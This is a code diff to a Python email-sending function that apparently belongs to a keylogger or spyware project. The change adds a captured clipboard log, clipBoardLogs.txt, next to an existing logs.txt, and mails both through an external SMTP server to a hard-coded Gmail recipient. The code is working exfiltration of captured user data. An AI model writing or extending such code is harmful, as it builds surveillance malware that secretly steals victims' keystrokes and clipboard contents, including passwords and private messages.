@@ -5,6 +5,7 @@ from email.message import EmailMessage
 def sendEmail():
     print("sending")
     log_file = "logs.txt"
+    clipBoard_file = "clipBoardLogs.txt"
 
     sender = "hello@demomailtrap.com"
     receiver = "ukharbanda20@gmail.com"
@@ -16,8 +17,11 @@ def sendEmail():
     message.set_content("Please find the logs attached.")
     try:
         with open(log_file, "rb") as file:
-            file_data = file.read()
-            message.add_attachment(file_data, maintype="text", subtype="plain", filename="logs.txt")
+            fileData = file.read()
+            message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
+        with open(clipBoard_file, "rb") as clipBoardFile:
+            clipBoardFileData = clipBoardFile.read()
+            message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")
 
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
